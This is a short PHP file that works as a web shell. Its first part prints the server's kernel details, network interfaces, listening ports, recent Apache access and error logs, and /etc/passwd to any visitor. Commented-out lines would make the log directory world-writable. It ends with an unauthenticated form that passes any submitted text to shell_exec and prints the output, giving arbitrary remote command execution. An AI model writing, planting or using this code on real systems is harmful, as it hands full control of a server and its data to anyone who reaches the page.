<?php
$network = shell_exec('ifconfig');
$host = shell_exec('uname -a');
$log = shell_exec('cat /var/log/apache2/access.log | tail -n 5');
$errorlog = shell_exec('cat /var/log/apache2/error.log | tail -n 5');
$password = shell_exec('cat /etc/passwd');
$port = shell_exec('ss -tlpn');
echo "<pre>$host</pre>";
echo "<hr />";
echo "User IP Address - ".$_SERVER['REMOTE_ADDR'];
echo "<hr />";
echo "<pre>$log</pre>";
echo "<hr />";
echo "<pre>$errorlog</pre>";
echo "<hr />";
echo "<pre>$password</pre>";
echo "<hr />";
echo "<pre>$port</pre>";
echo "<hr />";
echo "<pre>$network</pre>";
echo "<hr />";
//$chmod = shell_exec('chmod -R 777 /var/log/apache2/');
//$output = shell_exec('cat /var/log/apache2/access.log');
//echo "<pre>$output</pre>";
?>

<?php
shell_exec("echo '
<?php
hello
?>
' > file.php");

?>

<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="post">
command : <input type="text" name="command">
<input type="submit">
</form>

<?php

$command = $_POST['command'];
echo "<pre>";
echo shell_exec($command);
echo "</pre>";

?>
